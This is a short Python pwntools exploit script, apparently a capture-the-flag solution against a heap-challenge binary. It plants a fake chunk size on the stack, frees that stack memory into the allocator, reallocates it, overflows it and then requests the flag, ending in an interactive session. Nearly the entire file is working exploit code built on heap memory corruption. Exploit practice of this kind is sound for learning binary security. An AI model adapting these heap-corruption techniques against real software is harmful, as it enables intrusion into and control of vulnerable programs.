#!/bin/python

from pwn import * 
import sys

context.arch = 'amd64'

STACK_OFFSET = 0x40
BUFFER_OFF = 0x118

def get_leak():
    proc.recvuntil(b"[LEAK]")
    proc.recvuntil(b": ")
    return int(proc.recvline(drop=True)[:-1], 16)


def malloc(idx, size):
    proc.sendline(b"malloc")
    proc.sendline(str(idx))
    proc.sendline(str(size))


def free(idx):
    proc.sendline(b"free")
    proc.sendline(str(idx))


def scanf(idx, contents: bytes):
    proc.sendline(b"scanf")
    proc.sendline(str(idx))
    proc.sendline(contents)


def puts(idx):
    proc.sendline(b"puts")
    proc.clean()
    proc.sendline(str(idx))

    proc.recvuntil(b"Data: ")
    return proc.recvline(drop=True)


def tcache_get_two_entries(bin):
    malloc(14, bin)
    malloc(15, bin)
    free(15)
    free(14)


def get_addr_num(addr: bytes):
    return u64(addr.ljust(8, b'\x00'))


size = 16 * 5
if (len(sys.argv) == 2):
    proc = process(sys.argv[1])
else: 
    proc = gdb.debug(sys.argv[1], '''
                     pwndbg-init
                     ''')

size = 16 * 11
proc.sendline(b"stack_scanf")
proc.sendline(cyclic(STACK_OFFSET-8)+p64(size))
proc.sendline(b"stack_free")
malloc(0, size - 16)
scanf(0, b'A' * 0x80)

proc.sendline(b"send_flag")
proc.sendline(b'A' * 16)

proc.interactive()
